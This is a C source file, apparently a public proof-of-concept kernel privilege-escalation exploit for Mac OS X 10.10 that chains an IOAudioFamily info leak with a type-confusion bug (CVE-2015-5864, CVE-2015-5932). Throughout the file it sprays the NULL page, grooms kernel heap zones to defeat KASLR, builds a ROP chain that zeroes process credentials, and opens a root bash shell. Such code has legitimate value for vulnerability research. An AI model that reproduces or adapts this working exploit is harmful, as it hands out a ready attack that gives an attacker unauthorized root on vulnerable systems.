/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.10
 * BuildVersion:   14A389
 *
 * based on: https://github.com/kpwn/tpwn
 * CVE-2015-5932 (type confusion) / CVE-2015-5864 (IOAudioFamily infoleak)
 
 References:
 - https://github.com/kpwn/tpwn
 - https://github.com/jndok/tpwn-bis
 - https://archive.fo/NJHtT
 - https://opensource.apple.com/source/IOAudioFamily/IOAudioFamily-200.6/IOAudioEngineUserClient.cpp
   (10.10, IOAudioFamily-200.6)

$ ./exploit
[+] off_w: 162
[+] KASLR slide is 0x00000007e00000
[+] Got root!
 */

#include "librop.h"

#define HEAP_OBJECTS_NR 0x100
#define DEBUG 0

static mach_port_t servicea = 0;
static mach_port_t servicex = 0;

typedef struct
{
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;


void *alloc(void *address, uint32_t size)
{
    vm_deallocate(mach_task_self(), (vm_address_t) address, size);
    vm_allocate(mach_task_self(), (vm_address_t *) &address, size, 0);
    bzero(address, size);
    return address;
}


uint64_t leak_heap_ptr(io_connect_t *connect)
{
    /* https://opensource.apple.com/source/IOAudioFamily/IOAudioFamily-200.6/IOAudioEngineUserClient.cpp

    IOReturn IOAudioEngineUserClient::getConnectionID(UInt32 *connectionID)
    {
        audioDebugIOLog(3, "+-IOAudioEngineUserClient[%p]::getConnectionID(%p)\n", this, connectionID);

        *connectionID = (UInt32) (((UInt64)this >> 8) & 0x00000000FFFFFFFFLLU) ;
        return kIOReturnSuccess;
    }
    */

    kern_return_t kr = 0;

    kr = IOServiceOpen(servicea, mach_task_self(), 0, connect);
    EXIT_ON_MACH_ERROR("IOServiceOpen", kr);

    uint64_t    scalarO_64 = 0;
    uint32_t    outputCount = 1;

    kr = IOConnectCallScalarMethod(*connect, 2 /*IOMethod*/, NULL, 0, &scalarO_64, &outputCount);
    EXIT_ON_MACH_ERROR("IOServiceOpen", kr);

    scalarO_64 <<= 8;
    scalarO_64 |=  0xffffff0000000000;

#if DEBUG
    printf("[i] scalarO_64 leak: %llx\n", scalarO_64);
#endif

    return scalarO_64;
}

static uint16_t off_w = 0;

/* Set the offset (off_w) to p_flag+2 add 0x10 to the address in argument */
void or_everywhere(uint64_t add)
{
    io_connect_t connect = MACH_PORT_NULL;
    alloc(0, 0x1000);

    volatile uint64_t *mp = (uint64_t *) 0;

    /* Run only once */
    if(!off_w)
    {
        /*
        rdi = task_t (NULL in our case)

        __text:FFFFFF80007CE760                    _bsd_set_dependency_capable
        __text:FFFFFF80007CE760 55                      push    rbp
        __text:FFFFFF80007CE761 48 89 E5                mov     rbp, rsp
        __text:FFFFFF80007CE764 53                      push    rbx
        __text:FFFFFF80007CE765 50                      push    rax
        __text:FFFFFF80007CE766 48 8B 9F 00 03 00 00    mov     rbx, [rdi+300h]
        __text:FFFFFF80007CE76D 48 85 DB                test    rbx, rbx
        __text:FFFFFF80007CE770 74 24                   jz      short loc_FFFFFF80007CE796
        __text:FFFFFF80007CE772 48 81 C3 60 01 00 00    add     rbx, 160h
        __text:FFFFFF80007CE779 0F 1F 80 00 00 00 00    nop     dword ptr [rax+00000000h]
        __text:FFFFFF80007CE780 8B 3B                   mov     edi, [rbx]
        __text:FFFFFF80007CE782 89 FE                   mov     esi, edi
        __text:FFFFFF80007CE784 81 CE 00 00 10 00       or      esi, 100000h
        __text:FFFFFF80007CE78A 48 89 DA                mov     rdx, rbx
        __text:FFFFFF80007CE78D E8 5E BD 0C 00          call    _OSCompareAndSwap
        __text:FFFFFF80007CE792 84 C0                   test    al, al
        __text:FFFFFF80007CE794 74 EA                   jz      short loc_FFFFFF80007CE780
        __text:FFFFFF80007CE796 48 83 C4 08             add     rsp, 8
        __text:FFFFFF80007CE79A 5B                      pop     rbx
        __text:FFFFFF80007CE79B 5D                      pop     rbp
        __text:FFFFFF80007CE79C C3                      retn


        rbx = *(rdi + 0x300) // rbx = *(0+0x300) = 0xc00
        rbx += 0x160         // rbx += 0x160 = 0xd60
        edi = *(rbx)         // edi = *(rbx) = *(0xd60) = 0x0
        esi = edi
        esi |= 0x100000
        rdx = rbx            //  rdx = 0xd60

        *rdx = esi           // (happens in _OSCompareAndSwap)
        */

        /* Spray the memory with the 0xC00 values
        0x620: 00 0c 00 00 00 00 00 00 00 0c 00 00 00 00 00 00
        0x630: 00 0c 00 00 00 00 00 00 00 0c 00 00 00 00 00 00
        */
        for (mp = 0; (uint32_t)mp < 0xc00; mp++)
        {
            *mp = (uint64_t)0xc00;
        }

        /*
        - OR with 0x10 somewhere, the exact location could be calculated above (0xd62)
        - task->bsd_info->p_flag |= P_DEPENDENCY_CAPABLE (0x00100000);
        - 0->0xc00->0x160 |= 0x00100000
        */
        IOServiceOpen(servicex, kIOMasterPortDefault, 0, &connect);
        IOServiceClose(connect);

        /* Find the corrupted offset in memory (= 0xd62) */
        char *kp;
        for (kp = (char *)0xc00; (uint64_t) kp < 0x1000; kp++)
        {
            if (*kp == 0x10)
            {
                break;
            }
        }

        /* Save the offset from 0xc00 */
        off_w = (uint16_t) kp - 0xc00;

        /* If nothing found, exit */
        if ((uint32_t)kp == 0x1000)
        {
            vm_deallocate(mach_task_self(), 0, 0x1000);
            puts("not vulnerable");
            exit(-1);
        }

        /* Spray the memory again
        >>> hex( 0xd62-0xc00 ) = '0x162' (off_w)
        >>> hex( 0xc00-0x162 ) = '0xa9e'
        0x550: 9e 0a 00 00 00 00 00 00 9e 0a 00 00 00 00 00 00
        0x560: 9e 0a 00 00 00 00 00 00 9e 0a 00 00 00 00 00 00
        */
        for (mp = 0; (uint32_t)mp < 0xc00; mp++)
        {
            *mp = (uint64_t)0xc00 - off_w;
        }

        /* Overwrite the memory at 0xc00 with 0x10
        0->0xa9e->0x160 |= 0x00100000
          0->0xa9e = 0xa9e
          0xa9e + 0x160 = 0xbfe
          0xbfe + 0x2 = 0xc00
        0xc00: 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
         */
        IOServiceOpen(servicex, kIOMasterPortDefault, 0, &connect);
        IOServiceClose(connect);

        /* If we have no controlled overwrite, exit */
        if (*((char *)0xC00) != 0x10)
        {
            vm_deallocate(mach_task_self(), 0, 0x1000);
            puts("wrong offset");
            exit(-2);
        }
        printf("[+] off_w: %x\n", off_w);
    }

    /* Knowing the correct offset, we have a controlled OR |= 0x10 */
    for (mp = 0; (uint32_t)mp < 0xc00; mp++)
    {
        *mp = (uint64_t)(add - off_w);
    }
    IOServiceOpen(servicex, kIOMasterPortDefault, 0, &connect);
    IOServiceClose(connect);

    vm_deallocate(mach_task_self(), 0, 0x1000);
}


void send_kernel_data(char *vz, size_t svz, mach_port_t *msgp)
{
    oolmsg_t *msg = calloc(sizeof(oolmsg_t) + 0x2000, 1);
    if(!*msgp)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    // bzero(msg, sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)vz;
    msg->desc.size = svz;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    free(msg);
}


char *read_kernel_data(mach_port_t port)
{
    oolmsg_t *msg = calloc(sizeof(oolmsg_t) + 0x2000, 1);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t) + 0x2000, port, 0, MACH_PORT_NULL);
    return msg->desc.address;
}


int main(int argc, char **argv, char **envp)
{
    kernel_map_t *km = map_file("/System/Library/Kernels/kernel");
    memory_map_t *io_audio_family_map = map_file("/System/Library/Extensions/IOAudioFamily.kext/Contents/MacOS/IOAudioFamily");
    uint64_t kslide = 0;

    /*
    __const:00000000000186D0 __ZTV23IOAudioEngineUserClient dq 0
    __const:00000000000186D8                 dq 0
    __const:00000000000186E0                 dq offset __ZN23IOAudioEngineUserClientD1Ev
    __const:00000000000186E0 ; IOAudioEngineUserClient::~IOAudioEngineUserClient() <= kslide addr
    */
    uint64_t io_audio_family_map_load_address = find_kext_address("com.apple.iokit.IOAudioFamily");
#if DEBUG
    printf("[i] com.apple.iokit.IOAudioFamily kext at %#016llx\n", io_audio_family_map_load_address);
#endif
    uint64_t vtable_ptr = io_audio_family_map_load_address +
                          + find_symbol_address(io_audio_family_map, "__ZTV23IOAudioEngineUserClient")
                          + 0x10;

    kern_return_t err;
    io_iterator_t iterator;

    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iterator);
    servicex = IOIteratorNext(iterator);

    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOAudioEngine"), &iterator);
    servicea = IOIteratorNext(iterator);
    uint64_t c = 0;

    or_everywhere((uint64_t)&c);
    if (c != 0x10)
    {
        puts("not vulnerable");
        return 2;
    }

    /*-----------------------------------------------------------------*/
    struct kernel_heap_info_t
    {
        uint64_t kobject; // *this* pointer
        io_connect_t connect;
        mach_port_t port;
    } *heap_info = calloc(sizeof(struct kernel_heap_info_t), HEAP_OBJECTS_NR);

repeat:
    ;

    /* With second or more pass, free the connections 11 .. 2 */
    int max_count = 10;
    while (max_count--)
    {
        if (heap_info[max_count + 2].connect)
        {
            IOServiceClose(heap_info[max_count + 2].connect);
            heap_info[max_count + 2].connect = 0;
        }
    }

    /* Ignore the leaked pointers that are located in the last page's slot (0xc00 + 1024 = 0x1000) */
    while (((heap_info[0].kobject = leak_heap_ptr(&(heap_info[0].connect))) & 0xfff) == 0xc00)
    {
        heap_info[0].connect = 0;
    }

    /* Find in the kalloc.1024 zone two adjacent objects */
    max_count = 10;
    while ((heap_info[1].kobject = leak_heap_ptr(&(heap_info[1].connect))) )
    {
        if (heap_info[1].kobject == 1024 + heap_info[0].kobject)
        {
            break;
        }
        if (max_count == 0)
        {
            goto repeat;
        }
        max_count--;
        /* Continue, but keep the references */
        heap_info[max_count + 2].connect = heap_info[1].connect;
        heap_info[1].connect = 0;
    }

    /* Kernel objects found, but there is a connection error */
    if (!heap_info[0].connect || !heap_info[1].connect)
    {
        exit(1);
    }

    /* Poke the hole */
    IOServiceClose(heap_info[0].connect);

    /* Buffer is filled with bytes of value zero */
    char *vz = calloc(1500, 1);

    /*
    struct vm_map_copy {
        int                     type;
        vm_object_offset_t      offset;
        vm_map_size_t           size;
        union {
            struct vm_map_header hdr;    // ENTRY_LIST
            vm_object_t          object; // OBJECT
            struct {
                void             *kdata;      // KERNEL_BUFFER
                vm_size_t        kalloc_size; // size of this copy_t
            } c_k;
        } c_u;
    };

    sizeof(struct vm_map_copy) = 0x58
    */
    int vm_map_copy_header_length = 0x58;

    /* Send HEAP_OBJECTS_NR objects with the size 0x3a8 */
    for (int i = 0; i < HEAP_OBJECTS_NR; i++)
    {
        /* hex(1024 - 0x58) = 0x3a8 */
        send_kernel_data(vz, 1024 - vm_map_copy_header_length, &(heap_info[i].port));
    }

    /* Corrupt the one which is located in our hole, just before the IOAudioEngine vtable */
    or_everywhere(heap_info[0].kobject + 16);  // 0x3a8 -> 0x3b8
    or_everywhere(heap_info[0].kobject + 500); // We need to corrupt also some data to differentiate

    char found = 0;

    /* Receive the messages */
    for (int i = 0; i < HEAP_OBJECTS_NR; i++)
    {
        char *data = read_kernel_data(heap_info[i].port);
        if (!found && memcmp(data, vz, 1024 - vm_map_copy_header_length))
        {
            /* Strings not identical after receiving, so our data got successfully corrupted */
            kslide = (*(uint64_t *)((1024 - vm_map_copy_header_length + (char *)data))) - vtable_ptr ;
            found = 1;
        }
    }

    if (!found)
    {
        exit(1);
    }

#if DEBUG
    printf("[i] heap_info[1].kobject %#016llx\n", heap_info[1].kobject);
#endif

    printf("[+] KASLR slide is %#016llx\n", kslide);
    sync();

    /*
    __text:000000000000B274 ; __int64 __fastcall IOAudioEngineUserClient::stopClient(IOAudioEngineUserClient *__hidden this)
    __text:000000000000B27E mov     r14, rdi
    __text:000000000000B2A0 mov     r15, [r14+208h] // 0x10
    __text:000000000000B2A9 mov     r15, [r15+40h]
    __text:000000000000B2AD test    r15, r15
    __text:000000000000B2B0 jz      short loc_B306
    __text:000000000000B2B2 mov     rdi, r15        // this
    __text:000000000000B2B5 call    IOAudioClientBufferSet::cancelWatchdogTimer(void)


    __text:0000000000008452 ; __int64 __fastcall IOAudioClientBufferSet::cancelWatchdogTimer(IOAudioClientBufferSet *__hidden this)
    __text:0000000000008458 mov     rbx, rdi        // rdi, rbx = 0x10
    __text:000000000000845B mov     rdi, [rbx+10h]  // rdi = rdi = *[0x10+0x10=0x20]
    __text:000000000000845F test    rdi, rdi
    __text:0000000000008462 jz      short loc_84B4
    __text:0000000000008464 mov     rax, [rdi]
    __text:0000000000008467 call    qword ptr [rax+20h]
    */

    or_everywhere(heap_info[1].kobject + 0x220); // setOnline
    or_everywhere(heap_info[1].kobject + 0x208); // set pointer to 0x000000000010 (!= NULL)
    alloc(0, 0x1000);

    // char rop_start[1024] = {0};
    char *rop_start = calloc(1, 1024);
    uint64_t *rop = (uint64_t *) rop_start;

    uint64_t *rax = calloc(1, 0x1000);
    rax [ 0x00 / sizeof(uint64_t) ] = 1; // ...
    rax [ 0x08 / sizeof(uint64_t) ] = 2; // r15
    rax [ 0x10 / sizeof(uint64_t) ] = 3; // rbp
    rax [ 0x18 / sizeof(uint64_t) ] = SLIDE_PTR(POP_RAX__RET);   // put 'pivot_rax__ret'(0x20) to rax and ret to 0x28
    rax [ 0x20 / sizeof(uint64_t) ] = SLIDE_PTR(PIVOT_RAX__RET); // jumped from transfer(rax), now ret to 0x18
    rax [ 0x28 / sizeof(uint64_t) ] = SLIDE_PTR(POP_RAX__RET);
    rax [ 0x30 / sizeof(uint64_t) ] = 0; // rax
    rax [ 0x38 / sizeof(uint64_t) ] = SLIDE_PTR(POP_RSP__RET);
    rax [ 0x40 / sizeof(uint64_t) ] = (uint64_t) rop_start; // rsp

#if DEBUG
    printf("[i] rop_start: %p\n", rop_start);
    for (int i = 0; i < 9; i++)
    {
        printf("    [rax %x:0x%llx]\n", i, *(uint64_t *) ( rax + i));
    }
#endif

    /* Reverting the IOAudioEngineUserClient patches */
    *rop++ = SLIDE_PTR(POP_RDI__RET);
    *rop++ = (heap_info[1].kobject + 0x208); // rdi (1st arg)
    *rop++ = SLIDE_PTR(POP_RSI__RET);
    *rop++ = sizeof(uint64_t); // rsi (2nd arg)
    *rop++ = SLIDE_PTR(_bzero);

    *rop++ = SLIDE_PTR(POP_RDI__RET);
    *rop++ = (heap_info[1].kobject + 0x220); // rdi (1st arg)
    *rop++ = SLIDE_PTR(POP_RSI__RET);
    *rop++ = 1;
    *rop++ = SLIDE_PTR(_bzero);


    /* ----- BEGIN ESCALATION PAYLOAD ------ */
    // proc = _current_proc() (result would be in RAX)
    *rop++ = SLIDE_PTR(_current_proc);
    *rop++ = SLIDE_PTR(POP_RCX__RET);

    // ucred = _proc_ucred(proc)
    *rop++ = SLIDE_PTR(NOP__RET); // NOP would be in RCX, then RET to next line
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); // store RAX to RDI (1st arg)
    *rop++ = 0xDEADBEEFDEADBEEF; // RBP
    *rop++ = SLIDE_PTR(_proc_ucred);

    // posix_cred = _posix_cred_get(ucred)
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX);
    *rop++ = 0xDEADBEEFDEADBEEF;
    *rop++ = SLIDE_PTR(_posix_cred_get);

    // _bzero(posix_cred, sizeof(int) * 3)
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX);
    *rop++ = 0xDEADBEEFDEADBEEF;
    *rop++ = SLIDE_PTR(POP_RSI__RET);
    *rop++ = sizeof(int) * 3; // RSI, 2nd arg
    *rop++ = SLIDE_PTR(_bzero);
    /* ----- END ESCALATION PAYLOAD  ------ */

    /* Fix the locks */

    /*
    IOAudioEngineUserClient::initWithAudioEngine(IOAudioEngineUserClient *this, IOAudioEngine *, task *, void *, unsigned int, OSDictionary *)
    __text:000000000000892C                 call    _IORecursiveLockAlloc
    __text:0000000000008931                 mov     [r12+210h], rax
    */
    *rop++ = SLIDE_PTR(POP_RAX__RET);
    *rop++ = (heap_info[1].kobject + 0x210);
    *rop++ = SLIDE_PTR(READ_RAX_TO_RAX__POP_RBP__RET);
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX);
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(find_symbol_address(km, "_IORecursiveLockUnlock"));

    /*
    __text:0000000000008942                 mov     rdi, [r12+0D8h]
    __text:000000000000894A                 mov     rax, [rdi]
    __text:000000000000894D                 call    qword ptr [rax+688h]
    __text:0000000000008953                 mov     [r12+0E0h], rax
    */
    *rop++ = SLIDE_PTR(POP_RAX__RET);
    *rop++ = (heap_info[1].kobject + 0xe0);
    *rop++ = SLIDE_PTR(READ_RAX_TO_RAX__POP_RBP__RET);
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); // store RAX to RDI (1st arg)
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(find_symbol_address(km, "__ZN10IOWorkLoop8openGateEv"));

    /*
    __text:0000000000008972                 mov     rdi, r12 ; this
    __text:0000000000008975                 call    __ZN13IOCommandGate11commandGateEP8OSObjectPFiS1_PvS2_S2_S2_E
    __text:000000000000897A                 mov     [r12+0E8h], rax
    */
    *rop++ = SLIDE_PTR(POP_RAX__RET);
    *rop++ = (heap_info[1].kobject + 0xe8);
    *rop++ = SLIDE_PTR(READ_RAX_TO_RAX__POP_RBP__RET);
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(POP_RCX__RET);
    *rop++ = SLIDE_PTR(NOP__RET);
    *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX);
    *rop++ = 0xDEADBEEFDEADBEEF; // rbp
    *rop++ = SLIDE_PTR(find_symbol_address(km, "__ZN13IOEventSource8openGateEv"));

    /* return from the kernel */
    *rop++ = SLIDE_PTR(_thread_exception_return);


#if DEBUG
    for (int i = 0; i < rop - (uint64_t *) rop_start; i++)
    {
        printf("    [rop %02x:0x%0llx]\n", i, *(uint64_t *) (rop_start + i * sizeof(uint64_t)));
    }
#endif

    volatile uint64_t *transfer = (uint64_t *) 0x0;
    transfer[ 0x00 / sizeof(uint64_t) ] = (uint64_t) 0x1111111111111111;
    transfer[ 0x08 / sizeof(uint64_t) ] = (uint64_t) 0x2222222222222222;
    transfer[ 0x10 / sizeof(uint64_t) ] = (uint64_t) 0x3333333333333333;
    transfer[ 0x18 / sizeof(uint64_t) ] = (uint64_t) rax; // DEBUG
    transfer[ 0x20 / sizeof(uint64_t) ] = (uint64_t) &transfer[3]; // rdi

    IOConnectRelease((io_connect_t) heap_info[1].connect); // running code!

    vm_deallocate(mach_task_self(), 0, 0x1000);

    if (getuid() == 0)
    {
        puts("[+] Got root!");
        system("/bin/bash");
    }

    /* if we are here, exploit failed */
    return 0;
}
